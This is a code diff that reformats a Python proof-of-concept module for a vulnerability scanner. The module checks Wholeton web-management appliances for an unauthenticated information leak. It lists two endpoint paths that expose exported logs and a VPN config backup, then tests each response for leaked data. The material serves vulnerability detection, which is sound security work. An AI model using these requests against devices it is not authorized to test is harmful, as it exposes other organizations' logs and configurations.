@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 import urllib
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Wholeton_0004' # 平台漏洞编号，留空
+    vuln_id = 'Wholeton_0004'  # 平台漏洞编号，留空
     name = '惠尔顿上网行为管理系统 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         惠尔顿（Wholeton）上网行为管理系统多处未授权访问，造成信息泄露：
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '惠尔顿上网行为管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e4e9cbee-d3c0-48d1-8493-bd7d129b2006'
@@ -34,18 +36,18 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
-            arg = self.target       
+            arg = self.target
             payloads = [
                 '/base/web/ExportXml.php?type=1',
                 '/base/vpn/download_bak.php']
             header = 'Range:  bytes=0-100'
             for payload in payloads:
                 target = arg + payload
-                code, head, res, errcode, _ = hh.http(target, header=header);
+                code, head, res, errcode, _ = hh.http(target, header=header)
                 if code == 200 and ('<Subject Remark' in res and 'Log' in res) or ('filename= config.bak' in head and 'Wholeton' in res):
-                    #security_hole(target)
+                    # security_hole(target)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -54,6 +56,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
